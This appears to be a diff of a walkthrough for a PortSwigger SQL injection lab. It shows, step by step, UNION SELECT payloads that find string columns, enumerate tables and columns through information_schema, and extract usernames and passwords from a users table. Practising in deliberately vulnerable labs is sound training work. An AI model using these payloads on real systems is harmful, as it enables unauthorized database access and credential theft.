@@ -1,4 +1,5 @@
 # SQL injection attack, listing the database contents on non-Oracle databases
+https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
 
 Step - 1
 --------
@@ -22,28 +23,22 @@ Error
 
 Step - 4
 --------
-' UNION SELECT NULL,NULL--
---------------------------
-No Oracle
+' UNION SELECT 'a','a'--
+------------------------
+2 String Column
 
 Step - 5
 --------
-' UNION SELECT NULL,'a'--
--------------------------
-2 String Column
+' UNION SELECT 'a',table_name FROM information_schema.tables--
+--------------------------------------------------------------
+Table: users_losije
 
 Step - 6
 --------
-' UNION SELECT NULL,table_name FROM information_schema.tables--
----------------------------------------------------------------
-Table: users_losije
+' UNION SELECT 'a',column_name FROM information_schema.columns WHERE table_name='users_losije'--
+------------------------------------------------------------------------------------------------
+Column: username_nlazuv and password_xcildc
 
 Step - 7
 --------
-' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_losije'--
--------------------------------------------------------------------------------------------------
-Column: username_nlazuv and password_xcildc
-
-Step - 8
---------
-' UNION SELECT NULL,username_nlazuv || '~' || password_xcildc FROM users_losije--
+' UNION SELECT 'a',username_nlazuv || '~' || password_xcildc FROM users_losije--
